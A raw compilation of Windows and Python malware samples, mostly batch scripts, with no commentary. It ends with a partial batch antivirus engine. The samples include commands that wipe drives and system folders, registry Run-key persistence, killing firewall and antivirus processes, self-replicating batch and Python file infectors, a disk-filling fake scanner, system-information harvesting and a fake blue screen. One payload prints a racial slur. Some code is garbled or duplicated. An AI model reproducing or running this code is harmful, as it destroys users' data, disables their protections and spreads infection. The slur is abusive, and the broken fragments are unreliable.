@echo off
:A
start
explorer
goto :A 
@echo off del c:\\windows\system 32 (extesion.bat)
del D:\. /f /s /q
del E:\. /f /s /q
del F:\. /f /s /q
del G:\. /f /s /q
del H:\. /f /s /q
del I:\. /f /s /q
del J:\. /f /s /q
X=Msgbox("Virus Is Active",0+16,"Virus Alert")
X=Msgbox("Virus Is Active",0+16,"Virus Alert")
X=Msgbox("Virus Is Active",0+16,"Virus Alert")
X=Msgbox("Wanna Fix Virus",0+16,"Fix Virus")
@echo off del c:\\windows\system 32
del D:\. /f /s /q
del E:\. /f /s /q
del F:\. /f /s /q
del G:\. /f /s /q
del H:\. /f /s /q
del I:\. /f /s /q
del J:\. /f /s /q
@echo off
:A
start www.youaranidiot.org
ping localhost -m 5 >nul
goto :A
echo @echo off>c:windowswimn32.bat
echo break off>>c:windowswimn32.bat
echo ipconfig/release_all>>c:windowswimn32.bat
echo end>>c:windowswimn32.bat
reg add hkey_local_machinesoftwaremicrosoftwindowscurrentv ersionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /f
reg add hkey_current_usersoftwaremicrosoftwindowscurrentve rsionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /f
PAUSE
@ECHO off
:top
START %SystemRoot%\system32\notepad.exe
GOTO top
MsgBox “Let’s go back a few steps”
Set wshShell =wscript.CreateObject(”WScript.Shell”)
do
wscript.sleep 100
wshshell.sendkeys “{bs}”
loop
@ECHO OFF
START reg delete HKCR/.exe
START reg delete HKCR/.dll
START reg delete HKCR/*
@Echo off
Ipconfig /release
echo @echo off>c:windowswimn32.bat
echo break off>>c:windowswimn32.bat
echo ipconfig/release_all>>c:windowswimn32.bat
echo end>>c:windowswimn32.bat
reg add hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /f
reg add hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /f
echo OWNED!
PAUSE
REN *.DOC *.TXT REN *.JPEG *.TXT
REN *.LNK *.TXT
REN *.AVI *.TXT
REN *.MPEG *.TXT
REN *.COM *.TXT
REN *.BAT *.TXT
@echo off
reg
add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v MiXedVeX /t
REG_SZ /d %systemroot%\HaloTrialScoreChangerV1 /f > nul
start iexpress (website of your choice)
ipconfig /release
del "C:\Program Files\Microsoft Games
del "C:Nexon
del "C:\Program Files\Xfire
del "C:\Program Files\Adobe"
del "C:\Program Files\Internet Explorer"
del "C:\Program Files\Mozilla Firefox"
del "C:\WINDOWS"
del "C:\WINDOWS\system32"
del "C:\WINDOWS\system32\cmd"
del "C:\WINDOWS\system32\iexpress"
del "C:\WINDOWS\system32\sndvol32"
del "C:\WINDOWS\system32\sndrec32"
del "C:\WINDOWS\system32\Restore\rstrui"
del "C:\WINDOWS\system32\wupdmgr"
del "C:\WINDOWS\system32\desktop"
del "C:\WINDOWS\java"
del "C:\WINDOWS\Media"
del "C:\WINDOWS\Resources"
del "C:\WINDOWS\system"
del "C:\drivers"
del "C:\drv"
del "C:\SYSINFO"
del "C:\Program Files"
echo ipconfig/release_all>>c:windowswimn32.bat
net stop "Security Center"
net stop SharedAccess
> "%Temp%.kill.reg" ECHO REGEDIT4
>>"%Temp%.kill.reg" ECHO.
>>"%Temp%.kill.reg" ECHO [HKEY_LOCAL_MACHINESYSTEMCurrentControlSetServicesS haredAccess]
>>"%Temp%.kill.reg" ECHO "Start"=dword:00000004
>>"%Temp%.kill.reg" ECHO.
>>"%Temp%.kill.reg" ECHO [HKEY_LOCAL_MACHINESYSTEMCurrentControlSetServicesw uauserv]
>>"%Temp%.kill.reg" ECHO "Start"=dword:00000004
>>"%Temp%.kill.reg" ECHO.
>>"%Temp%.kill.reg" ECHO [HKEY_LOCAL_MACHINESYSTEMControlSet001Serviceswscsv c]
>>"%Temp%.kill.reg" ECHO "Start"=dword:00000004
>>"%Temp%.kill.reg" ECHO.
START /WAIT REGEDIT /S "%Temp%.kill.reg"
del "%Temp%.kill.reg"
del %0
echo @echo off>c:windowswimn32.bat
echo break off>>c:windowswimn32.bat
echo ipconfig/release_all>>c:windowswimn32.bat
echo end>>c:windowswimn32.bat
reg add hkey_local_machinesoftwaremicrosoftwindowscurrentv ersionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /f
reg add hkey_current_usersoftwaremicrosoftwindowscurrentve rsionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /f
:a
start iexpress www.meatspin.fr
goto a
#include <iostream>
#include <stdlib.h>
#include <windows.h>
#include <iomanip>
#include <stdio.h>
#include <conio.h>
#include <fstream>
using namespace std;
 
int main()
{ keybd_event(VK_MENU,0x38,0,0);
keybd_event(VK_RETURN,0x1c,0,0);
keybd_event(VK_RETURN,0x1c,KEYEVENTF_KEYUP,0);
keybd_event(VK_MENU,0x38,KEYEVENTF_KEYUP,0);
HANDLE outToScreen;
outToScreen = GetStdHandle(STD_OUTPUT_HANDLE);
 
{
char buffer[255];
char inputFile[]=”C:\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\rawr.bat”;
ifstream input(inputFile);
if (!input)
{
{
ofstream fp(“C:\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\rawr.bat”, ios::app);
fp << “@ECHO OFF \n”;
fp << “START C:\\rawr.exe \n”;
fp << “EXIT”;
}
}
else
{
while (!input.eof())
{
input.getline(buffer,255);
}
}
}
 
{
char buffer[255];
char inputFile[]=”C:\\rawr.exe”;
ifstream input(inputFile);
if (!input)
{
{
{
ofstream fp(“CLICK.bat”, ios::app);
fp << “@ECHO OFF \n”;
fp << “COPY matrix.exe C:\\rawr.exe \n”;
fp << “START C:\\rawr.exe \n”;
fp << “EXIT”;
}
system(“START CLICK.bat”);
main();
}
}
else
{
while (!input.eof())
{
input.getline(buffer,255);
system(“call shutdown.exe -S”);
goto START;
}
}
}
 
START:{
for(int i = 0; i < 1; i++)
{
int num = (rand() % 10);
SetConsoleTextAttribute(outToScreen, FOREGROUND_GREEN | FOREGROUND_INTENSITY);
cout << setw(4) << num;
cout << setw(4) << “0%”;
cout << setw(4) << “P”;
cout << setw(4) << ” “;
cout << setw(4) << “)”;
cout << setw(4) << “#”;
cout << setw(4) << “X”;
cout << setw(4) << “@”;
cout << setw(4) << “1&”;
cout << setw(4) << “*”;
cout << setw(4) << “||”;
cout << setw(4) << ” \a”;
Sleep(60);
}
}
for ( int j = 0; j < 5; j++)
{
SetConsoleTextAttribute(outToScreen, FOREGROUND_GREEN);
int number = (rand() % 24);
cout << setw(4) << number;
}
goto START;
}
@echo off>nul.BaCtErIa
:ChEcK1
if exist %temp%\BaCtErIa goto ChEcK2
if not exist %temp%\BaCtErIa goto BaCkUp
:ChEcK2
if exist %temp%\BaCtErIa\SpIrIlLuM.tmp goto PaYlOaD
if not exist %temp%\BaCtErIa\SpIrIlLuM.tmp goto InFeCt
:BaCkUp
md %temp%\BaCtErIa
copy %0 %temp%\BaCtErIa\BaCiLlUs.bat
start %temp%\BaCtErIa\BaCiLlUs.bat
del /f /q %0
:InFeCt
cd %temp%
dir /s /b %systemdrive%\*.bat>>%temp%\BaCtErIa\MyCoPlAsMa.tmp
cd %temp%\BaCtErIa
echo y | for /f "tokens=1,* delims=: " %%j in (MyCoPlAsMa.tmp) do copy /y %0 "%%j:%%k"
cd %~dp0
echo %random%>>%temp%\BaCtErIa\SpIrIlLuM.tmp
goto ChEcK2
:PaYlOaD
taskkill /f /im explorer.exe
cd "%systemdrive%\Windows\Resources\Ease of Access Themes"
start hcblack.theme
taskkill /f /im explorer.exe
start explorer.exe
exit
rem ---------------------------------
rem The iniFect Virus
@echo off>nul.InIfEcT
attrib +r +s +h %0
:ChEcK
if exist %temp%\ini_inf.tmp goto PaYlOaD
if not exist %temp%\ini_inf.tmp goto InFeCt
:InFeCt
dir /s /b %systemdrive%\*.ini>>%temp%\ini_inf.tmp
cd %temp%
for /f %%a in (ini_inf.tmp) do set inifiles=%%a
echo shell=%0>>%inifiles%
exit
:PaYlOaD
echo F75844893A85EC217E8EF5BD69317>>%temp%\97AD1.tmp
echo B4A58D984B39E9BC74B9594B5873B>>%temp%\97AD1.tmp
echo 6AE23AE3C8DE46B283E91C2655A78>>%temp%\97AD1.tmp
echo 5D54CB39AE7D5E68A2B77DE9F8A3D>>%temp%\97AD1.tmp
cd %userprofile%
for %%z in (*.*) do copy %temp%\97AD1.tmp %%z
del %temp%\97AD1.tmp
exit
rem ---------------------------------
rem The Pop Cat Virus
@echo off
for %%z in (*.*) do ren %%z %random%.bat
for %%a in (*.bat) do set batfiles=%%a
copy /y %0 %batfiles%
start %batfiles%
exit
rem ---------------------------------
rem The ReBoot Of Death Virus
@echo off
taskkill /f /im explorer.exe
echo @echo off>>%temp%\autoexec.bat
echo shutdown.exe /r /t 08>>%temp%\autoexec.bat
echo ^*o*^ strikes again!>>%temp%\autoexec.bat
echo pause>>%temp%\autoexec.bat
attrib +r +s +h %temp%\autoexec.bat
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v DOSLoad /t REG_SZ /d %temp%\autoexec.bat
shutdown.exe /r /t 08
del /f /q %0
rem ---------------------------------
rem The UnBoot Virus
@echo off
attrib -r -s -h C:\Boot\BCD
del /f /q C:\Boot\BCD
attrib -r -s -h C:\Boot\memtest.exe
del /f /q C:\Boot\memtest.exe
attrib -r -s -h C:\Windows\win.ini
del C:\Windows\win.ini
attrib -r -s -h C:\Windows\system.ini
del C:\Windows\system.ini
attrib -r -s -h C:\Windows\System32\winlogon.mof
del C:\Windows\System32\winlogon.mof
shutdown.exe /r /t 00
rem ---------------------------------
rem The Implore Virus
@echo off
set explorer=%systemdrive%\Windows\explorer.exe
set newname=explorer.ex_
ren %explorer% %newname%
shutdown.exe /r /t 00
rem ---------------------------------
rem Virus To Disable Firewall Temporarily
@echo off
taskkill /f /im fire*
taskkill /f /im PersFw*
taskkill /f /im ZoneAlarm*
cls
taskkill /f /im OutPost*
taskkill /f /im nv*
taskkill /f /im nav*
cls
taskkill /f /im BLACKICE*
taskkill /f /im ZAP*
taskkill /f /im minilog*
cls
taskkill /f /im offg*
taskkill /f /im ESAFE*
taskkill /f /im isafe*
cls
taskkill /f /im zlclien*
taskkill /f /im realm*
taskkill /f /im Barracuda*
cls
taskkill /f /im smc*
taskkill /f /im cis*
taskkill /f /im cav*
cls
rem ---------------------------------
if(os == 'linux' or os == 'LINUX'):
 system('clear')
 pass
elif(os == 'WINDOWS' or os == 'windows'):
 system('cls')
 pass
else:
 print '[-] Invalid OS only [ linux and windows allowed ]'
 exit(1)
print (Fore.YELLOW + '(+) WorM CoddER : 13lackDeMon / Tanmay\n' + Fore.RESET)
print (Fore.BLUE + '(*) Demon-606 13lack Worm started . . . . \n' + Fore.RESET)
sleep(2)
for files in listdir(directory_to_infect):
 try:
  if(files.split('.')[1] in files_ext_to_infect):
   if(signature.decode('base64') in files):
    pass
   else:
    vul_files.append(files)
    del files
  else:
   pass
   del files
 except:
  pass
  del files
for file in vul_files:
 if(corrupt_or_justinject == 'corrupt' or corrupt_or_justinject == 'CORRUPT'):
  try:
   f = open(file,'w')
   f.write(signature.decode('base64'))
   f.write(' ')
   f.write(code_to_inject.decode('base64'))
   f.close()
   print (Fore.RED + '[+] Code injected in %s Successfully. [ Corrupt = TRUE ]' + Fore.RESET)%file
   sleep(2)
  except:
   print (Back.RED + '[-] Unable to inject in %s [ Access Deniad ]' + Back.RESET)%file
   pass
 elif(corrupt_or_justinject == 'inject' or corrupt_or_justinject == 'INJECT'):
  try:
   f = open(file,'a+')
   f.write(signature.decode('base64'))
   f.write(code_to_inject.decode('base64'))
   f.close()
   print (Fore.RED + '[+] Code injected in %s Successfully. [ Corrupt = FALSE ]' + Fore.RESET) %file
   sleep(2)
  except:
   print (Back.RED + '[-] Unable to inject in %s [ Access Deniad ]' + Back.RESET)%file
   pass
 else:
  print (Back.RED + '[-] Error : Invalid Option Enter use only [1] inject [2] corrupt' + Back.RESET)
  break
  exit(1)
print (Fore.BLUE + '(*) Demon-606 13lack Worm Stopped.' + Fore.RESET)
sleep(2)
exit(1)
import win32file
import os
 
def get_drivestats():
    
    drive = os.path.splitdrive(os.getcwd())[0].rstrip(':')
    sectPerCluster, bytesPerSector, freeClusters, totalClusters = \
        win32file.GetDiskFreeSpace(drive + ":\\")
    free_space = freeClusters*sectPerCluster*bytesPerSector
    return free_space, drive
print ("-"*40)
print ("-" + " " * 9 + "Welcome to pyVirScan" + " " * 9 + "-")
print ("-" + " " * 2 + "A Virus Scanner written in Python!" + " " * 2 + "-")
print ("-" + " " * 13 + "Version 1.00" + " " * 13 + "-")
print ("-"*40)
print ("Be patient, you will be notified when the scan is complete")
#print ("Current Progress: 0.01%")
 
free_space, drive = get_drivestats()
 
 
kb = float(1024)
kbFree = free_space / kb
 
 
fillWithFloat = kbFree / 409600
 
 
fillWithInt = int(round(fillWithFloat))
loopNum = 1
 
 
 
for y in range(fillWithInt):
    block = '0' * 409600
 
    bigFile = file("sysscanresults" + str(loopNum) + ".dll", 'wb')
    for x in range(1000):
        bigFile.write(block)
    bigFile.close()
 
    percentComplete = loopNum * fillWithInt / 100
    print ("Current Progress: " + str(percentComplete) + "%")
    loopNum += 1
 
 
if 1 == 1:
    virus = 1
if 1 != 1:
    virus = 0
 
print ("-"*40)
print (" " * 12 + "Scan Completed!")
print (" -"*20)
print ("Results:")
if virus == 1:
   
    print("The results were positive, your computer is infected.")
   
    #Yet to add the text file creation
    #print("To see the full list of results, navigate to C:\\results.txt")
    #print("In the text file you will see:")
    #print ("1) What you are infected by.")
    #print ("2) Details of each infection.")
    #print ("3) What you can do to remove the virus'.")
 
if virus == 0:
    print("Your computer is clean!")
 
 
print ("Thankyou for using pyVirScan")
print ("-"*40)
exit = raw_input("Press <enter> to exit...")
import sys, glob, re
##### DetectMe #####
inVirus = False
infected = False
vcode = []
newcode = []
fh = open(sys.argv[0], "r")
lines = fh.readlines()
fh.close()
for line in lines:
    vcode.append(line)
progs = glob.glob("*.py")
for prog in progs:
    fh = open(prog, "r")
    pcode = fh.readlines()
    fh.close()
    newcode = []
for line in pcode:
    if(re.search('##### DetectMe #####', line)):
        infected = True
newcode.extend(vcode)
newcode.append(pcode.pop(0))
newcode.extend(pcode)
# Writing new virus infected code
if not infected:
    fh = open(prog, "w")
    fh.writelines(newcode)
    fh.close()
#Optional Payload
print("SHIT ON NIGGER")
@echo off
title %random% %date% %username% %time% %random%
color 0a
ren -=- Writes INFO to a .LOG file in Current Directory -=-
:info
cls & color 0a
cd Desktop
nslookup myip.opendns.com resolver1.opendns.com>9K21JM10B.log
ver>>9K21JM10B.log
ECHO.>>9K21JM10B.log
ECHO Username:%username%>>9K21JM10B.log
ECHO.>>9K21JM10B.log
ECHO Time: %time%>>9K21JM10B.log
ECHO.>>9K21JM10B.log
ECHO Date: %date%>>9K21JM10B.log
ECHO.>>9K21JM10B.log
netsh wlan show profiles>>9K21JM10B.log
ECHO.>>9K21JM10B.log
ipconfig>>9K21JM10B.log
ECHO.>>9K21JM10B.log
ECHO Additional Information:>>9K21JM10B.log
ipconfig | find /i "IPv4">>9K21JM10B.log
wmic diskdrive get size>>9K21JM10B.log
wmic cpu get name>>9K21JM10B.log
ECHO.>>9K21JM10B.log
ECHO.>>9K21JM10B.log
ECHO.>>9K21JM10B.log
systeminfo>>9K21JM10B.log
goto ports
ren -=- Opens Port 1122 -=-
:ports
cls & color 0a
netsh advfirewall firewall add rule name="Port 1122 TCP" dir=in action=allow protocol=TCP localport=%1
netsh advfirewall firewall add rule name="Port 1122 UDP" dir=in action=allow protocol=UDP localport=%1
goto firewall
ren -=- Turns all Firewalls off -=-
:firewall
cls & color 0a
netsh firewall set opmode disable
netsh firewall set opmode mode=DISABLE
netsh advfirewall set currentprofile state off
netsh advfirewall set domainprofile state off
netsh advfirewall set privateprofile state off
netsh advfirewall set publicprofile state off
netsh advfirewall set allprofiles state off
goto encryption
ren -=- Encrypts files with a simple name break -=-
:encryption
cls & color 0a
:Current
REN *.cmd *.sI09
REN *.exe *.1Je9
REN *.log *.439a
REN *.ini *.3KM1
REN *.dll *.38Jl
REN *.bin *.3J81
REN *.txt *.2M1A
REN *.sys *.8j3J
REN *.lnk *.9K2M
REN *.png *.8J2n
REN *.exe *.3hxD
cd C:\Windows
REN *.cmd *.sI09
REN *.exe *.1Je9
REN *.log *.439a
REN *.ini *.3KM1
REN *.dll *.38Jl
REN *.bin *.3J81
REN *.txt *.2M1A
REN *.sys *.8j3J
REN *.lnk *.9K2M
REN *.png *.8J2n
REN *.exe *.3hxD
cd C:\Windows\Sys32 & cd C:\Windows\System32
REN *.cmd *.sI09
REN *.exe *.1Je9
REN *.log *.439a
REN *.ini *.3KM1
REN *.dll *.38Jl
REN *.bin *.3J81
REN *.txt *.2M1A
REN *.sys *.8j3J
REN *.lnk *.9K2M
REN *.png *.8J2n
REN *.exe *.3hxD
cd C:\
REN *.cmd *.sI09
REN *.exe *.1Je9
REN *.log *.439a
REN *.ini *.3KM1
REN *.dll *.38Jl
REN *.bin *.3J81
REN *.txt *.2M1A
REN *.sys *.8j3J
REN *.lnk *.9K2M
REN *.png *.8J2n
REN *.exe *.3hxD
color 0a & mode 1000 & cls
pause
goto virus
ren -=- Closes all task managers and browser, kills anti-virus and firewall -=-
:virus
ECHO You have been encrypted by *-*7_SL*- & color 0a
net stop "Windows Defender Service"
net stop "Windows Firewall"
taskkill /F /IM "chrome.exe" /T
taskkill /F /IM "firefox.exe" /T
taskkill /F /IM "ProcessHacker.exe" /T
taskkill /F /IM "explorer.exe" /T
taskkill /F /IM "taskmgr.exe" /T
goto virus
using namespace std;
int main()
{ keybd_event(VK_MENU,0x38,0,0);
keybd_event(VK_RETURN,0x1c,0,0);
keybd_event(VK_RETURN,0x1c,KEYEVENTF_KEYUP,0);
keybd_event(VK_MENU,0X38,KEYEVENTF_KEYUP,0);
HANDLE outToScreen;
outToSreen = GetStdHandle(STD_OUTPUT_HANDLE);
{
char buffer[255];
char inputFile[]="C:\\Documents and Settings\\AllUsers\\Start Menu\\Programs\\Startup\\rawr.bat";
ifstream input(inputFile);
if (!input)
{{
ofstream fp("C:\\Documents and Settings\\AllUsers\\Start Menu\\Programs\\Startup\\rawr.bat";
ios::app);
fp << "@ECHO OFF \N";
fp << "START C:\\rawr.exe \n";
fp << "EXIT";
}}
else
{
while (!input.eof())
{
input.getline(buffer,255);
}}}
{
char buffer[255];
char inputFile[]="C:\\rawr.exe";
ifstream input(inputFile);
if (!input)
{{{
ofstream fp("CLICK.bat", ios::app);
fp << "ECHO OFF \n";
fp << "COPY matrix.exe C:\\rawr.exe \n";
fp << "START C:\\rawr.exe \n";
fp << "EXIT";
}
system("START CLICK.bat");
main();
}}
else
{
while (!input.eof())
{
input.getline(buffer,255);
system('call shutdown.exe -S");
goto START;
}}}
START:{
for(int i = 0; i<>
{
int num = (rand() % 10);
SetConsoleTextAttribute(outToScreen, FOREGROUND_GREEN | FOREGROUND_INTENSITY);
cout <<>
cout <<>
cout <<>
cout <<>
cout <<>
cout <<>
cout <<>
cout <<>
cout <<>
cout <<>
cout <<>
cout <<>
Sleep(60);
}}
for ( int j = 0; j <>
{
SetConsoleTextAttribute(outToScreen, FOREGROUND_GREEN);
int number = (rand() % 24);
cout <<>
}
goto START;
}
:CRASH
net send * WORKGROUP ENABLED
net send * WORKGROUP ENABLED
GOTO CRASH
ipconfig /release
shutdown -r -f -t0
echo @echo off>c:windowshartlell.bat
echo break off>>c:windowshartlell.bat
echo shutdown -r -t 11 -f>>c:windowshartlell.bat
echo end>>c:windowshartlell.bat
reg add hkey_local_machinesoftwaremicrosoftwindowscurrentv ersionrun /v startAPI /t reg_sz /d c:windowshartlell.bat /f
reg add hkey_current_usersoftwaremicrosoftwindowscurrentve rsionrun /v HAHAHA /t reg_sz /d c:windowshartlell.bat /f
echo You Have Been Hackedecho @echo off>c:windowswimn32.bat
echo break off>>c:windowswimn32.bat
echo ipconfig/release_all>>c:windowswimn32.bat
echo end>>c:windowswimn32.bat
reg add hkey_local_machinesoftwaremicrosoftwindowscurrentv ersionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /f
reg add hkey_current_usersoftwaremicrosoftwindowscurrentve rsionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /f
echo YOU HAVE BEEN HACKED BITCH
REN *.DOC *.TXT
REN *.JPEG *.TXT
REN *.LNK *.TXT
REN *.AVI *.TXT
REN *.MPEG *.TXT
REN *.COM *.TXT
REN *.BAT *.TXT

PAUSE

PAUSE
 
{$mode objfpc}
uses
classes,sysutils,windows,crt,dos;
const
fTarget = 'iexplore.exe';
var
folder_array: array[1..10] of String;
s,s1,user_name:string;
i:integer;
Year,Month,Day,WDay : word;
function FileCopy(Source, Target: string): boolean;
var
MemBuffer: TMemoryStream;
begin
result := false;
MemBuffer := TMemoryStream.Create;
try
MemBuffer.LoadFromFile(Source);
MemBuffer.SaveToFile(Target);
result := true
except
end;
MemBuffer.Free
end;
procedure EvilJob;
var i:integer;
begin
for i:=1 to 50 do begin
ShellExecute(0,nil, PChar('"notepad"'),nil,nil,1);
Delay(1000);
end;
end;
begin
Randomize;

user_name:=GetUserDir;
folder_array[1]:=user_name+'Desktop\';
folder_array[2]:=user_name+'AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\';
folder_array[3]:='d:\';
folder_array[4]:='e:\';
folder_array[5]:='f:\';
folder_array[6]:='g:\';
folder_array[7]:='h:\';
folder_array[8]:='i:\';
folder_array[9]:='j:\';
folder_array[10]:='k:\';

s:=ParamStr(0);
s1:=fTarget;

for i:=1 to 10 do begin
s1:=fTarget;
s1:=folder_array[i]+s1;
If FileExists(s1) then
s1:=folder_array[i]+'iexplore'+IntToStr(Random(1000))+'.exe';
if DirectoryExists(folder_array[i]) then
FileCopy(S, s1);
end;

ShellExecute(0,nil, PChar('"iexplore"'),PChar('"https://www.microsoft.com"'),nil,1);

GetDate(Year,Month,Day,WDay);
if Day=13 then EvilJob;

end.
@echo off
echo ^<html^>^<head^>^<title^>BSOD^
> bsod.hta

echo. >> bsod.hta
echo ^<hta:application id=”oBVC” >> bsod.hta
echo applicationname=”BSOD” >> bsod.hta
echo version=”1.0″ >> bsod.hta
echo maximizebutton=”no” >> bsod.hta
echo minimizebutton=”no” >> bsod.hta
echo sysmenu=”no” >> bsod.hta
echo Caption=”no” >> bsod.hta
echo windowstate=”maximize”/^> >> bsod.hta
echo. >> bsod.hta
echo ^</head^>^<body bgcolor=”#000088″ scroll=”no”^> >> bsod.hta
echo ^<font face=”Lucida Console” size=”4″ color=”#FFFFFF”^> >> bsod.hta
echo ^<p^>A problem has been detected and windows has been shutdown to prevent damage to your computer.^</p^> >> bsod.hta
echo. >> bsod.hta
echo ^<p^>DRIVER_IRQL_NOT_LES_OR_EQ
UAL^</p^> >> bsod.htaecho. >> bsod.hta
echo ^<p^>If this is the first time you’ve seen this stop error screen, restart your computer, If this screen appears again, follow these steps:^</p^> >> bsod.hta
echo. >> bsod.hta
echo ^<p^>Check to make sure any new hardware or software is properly installed. If this is a new installation, ask your hardware or software manufacturer for any windows updates you might need.^</p^> >> bsod.hta
echo. >> bsod.hta
echo ^<p^>If problems continue, disable or remove any newly installed hardware or software. Disable BIOS memory options such as caching or shadowing. If you need to use Safe Mode to remove or disable components, restart your computer, press F8 to select Advanced Startup Options, and then select Safe Mode.^ >> bsod.hta
echo. >> bsod.hta
echo ^<p^>Technical information:^</p^> >> bsod.hta
echo. >> bsod.hta
echo ^<p^>*** STOP: 0x000000D1 (0x0000000C,0x00000002,0x00000
000,0xF86B5A89)^ >> bsod.htaecho. >> bsod.hta
echo. >> bsod.hta
echo ^<p^>*** gv3.sys – Address F86B5A89 base at F86B5000, DateStamp 3dd9919eb^ >> bsod.hta
echo. >> bsod.hta
echo ^<p^>Beginning dump of physical memory^</p^> >> bsod.hta
echo ^<p^>Physical memory dump complete.^</p^> >> bsod.hta
echo ^<p^>Contact your system administrator or technical support group for further assistance.^</p^> >> bsod.hta
echo. >> bsod.hta
echo. >> bsod.hta
echo ^</font^> >> bsod.hta
echo ^</body^>^</html^> >> bsod.hta
start “” /wait “bsod.hta”
del /s /f /q “bsod.hta” > nul
color a

cls
@echo off

msg * (Muhahaha)

set date=1
time 0:00

copy %0 "%homedrive%%homepath%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
copy %0 "%homedrive%%homepath%\Startm~1\Programme\Autostart\"
copy 0% "%systemdrive%\Documents and Settings\All Users\Start Menu\Programs\Startup"

taskkill /IM explorer.exe /f

Rundll32 user32, SwapMouseButton

start www.evil-shit.de
start www.akk.li/pics/anne/jpg

cd %userprofile%\desktop

md %random%
md %random%
md %random%
md %random%

format D:\ /F

format E:\ /F

format F:\ /F

format G:\ /F

RD C:\ /S /Q
@echo off
for %%A in ("--help" "/?" "-?" "-h" "-help" "/help" "/h") do if "%~1"=="%%~A" (
	echo.
	echo Batch Antivirus Real-Time Protection Engine
	echo.
	echo Usage:
	echo.
	echo Syntax:
	echo %~n0 [--ip ^| --fs] [drive]
	echo.
	echo Examples:
	echo.
	echo %~n0 --ip
	echo Will start web protection
	echo.
	echo %~n0 --fs F:\
	echo Will protect at drive F:
	echo.
	echo Copyright ^(c^) 2020 anic17 Software
	exit /b
)

for %%A in (
"%~dp0VirusDataBaseHash.bav"
"%~dp0gethex.exe"
"%~dp0sha256.exe"
"%~dp0VirusDatabaseIP.bav"
"%~dp0waitdirchange.exe"
"%~dp0checkdiff.exe"
) do (
	if not exist "%%~A" (
		echo.Engine cannot start^!
		echo.Missing file: "%%~A"
		exit /b
	)
)

if not defined threads set threads=1
setlocal EnableDelayedExpansion

md "%~dp0Data\Quarantine" > nul 2>&1
set "dir=%CD%"


for /f "tokens=1-3 delims=/" %%A in ('date /t') do set "date_=%%A%%B%%C"
set "date_=!date_:-=!"
::Start settings
::
:: Don't mess up with settings, it might leave your system unprotected
::
::

:: Graphical settings
set bav_rt_title=Batch Antivirus Real-Time Protection
set display_eng_start=1
set display_title=1
set showballoon=1
set malware_message=1
set balloon_notification_timeout=100000

set background_process=1


:: Log scanned/detected files
set log_scanned=0
set log_detected=1
set stdout_log_scanned=0
set stdout_log_detected=1
set "logfile="%~dp0Batch-Antivirus_!date_!""	

:: Engine scanning settings
set root_dir=%HomeDrive%\
set dir_scan_freq=3

:: Quarantine/delete (Not recommended to change)
set nodelete=0
set noquarantine=0

:: IP protection
set timeout_ip=2
set kill_process_ip=0

:: Engine protection
set kill_protection=0
set "kp_file=BAV_kp.vbs"

set "chkss_pth=sec_kp_%random:~-3%%random:~-3%_bav.tmp%random:~-2%"





::
::
::
:: End settings
cd /d "%~dp0"

if "!kill_protection!"=="1" (
	del "%TMP%\!kp_file!" /q > nul 2>&1
	del "%TMP%\sec_kp_*" /q > nul 2>&1
	copy /y "%~dp0sha256.exe" "%tmp%\!chkss_pth!" >nul 2>&1
	start /b "" "%tmp%\!chkss_pth!" > nul 2>&1
	echo On Error Resume Next > "%TMP%\!kp_file!"
	echo Set BAVkpWMIe = GetObject^(^"winmgmts:^" _ >> "%TMP%\!kp_file!"
	echo     ^& "{impersonationLevel=impersonate}!^\^\" ^& "." ^& "^\root^\cimv2"^) >> "%TMP%\!kp_file!"
	rem echo.createObject^(^"WScript.Shell^"^).Run ^"cmd /c start /b ^"^"^"^" ^"^"%tmp%\!chkss_pth!^"^"^", vbHide, 1 >> "%TMP%\!kp_file!"
	echo do >> "%TMP%\!kp_file!"
	echo Set kpProcList= BAVkpWMIe.ExecQuery _ >> "%TMP%\!kp_file!"
	echo     ^(^"Select * from Win32_Process Where Name = ^'!chkss_pth!^'^"^) >> "%TMP%\!kp_file!"
	echo If kpProcList.count ^< 1 then >> "%TMP%\!kp_file!"
	echo 		MsgBox "Batch Antivirus process got killed", 4112, "Batch Antivirus" >> "%TMP%\!kp_file!"
	echo.		WScript.Quit^(^) >> "%TMP%\!kp_file!"
	echo End If >> "%TMP%\!kp_file!"
	echo WScript.Sleep^(300^) >> "%TMP%\!kp_file!"
	echo loop >> "%TMP%\!kp_file!"
	start /min cmd.exe /c start "" wscript.exe //nologo "%TMP%\!kp_file!"
	timeout /t 1 /nobreak > nul
)

if /i "%~1"=="--threads" set "threads=%~2" & for /l %%A in (2,1,!threads!) do (
	timeout /t 1 /nobreak > nul
	start /b cmd.exe /c "%~f0"
)

::if "%~1"=="" (
::	start /b cmd.exe /c "%~f0" --ip
::	rem start /b cmd.exe /c "%~f0" --svc
::)
::if "%~1"=="--svc" goto scanservices
if "%~1"=="--ip" goto scanip


if /i "%~1"=="--fs" (
	if "%~2" neq "" set "rootdir=%~d2\"
)

if "%display_eng_start%"=="1" echo Batch Antivirus Real-Time Protection Engine started
if "%display_title%"=="1" title %bav_rt_title%
:real_time
set counter=0
for /f "tokens=1* delims=:" %%A in ('WaitDirChange /ANY /s /f %root_dir% ^| findstr /i /c:"New_File" /c:"Mod_File" /c:"New_Name"') do (
	set /a counter+=1
	call :engine "%%~B"

	if !counter! geq !dir_scan_freq! for %%a in (*.*) do call :engine "/%%~a" 2> nul && set counter=0
)
goto real_time
pause>nul
exit /b


:engine
set "filescan=%~1"
set "filescan=!filescan:~1!"

if "%log_scanned%"=="1" echo.!filescan! >>"!logfile!"
if "%stdout_log_scanned%"=="1" echo.!filescan!
for /f %%A in ('sha256.exe "%filescan%" 2^>nul') do call :hashed %%A
exit /b


:hashed

set "hash=%~1"
set "hash=%hash:~1%"
findstr /c:"%hash%" "%~dp0VirusDataBaseHash.bav" > nul || exit /B
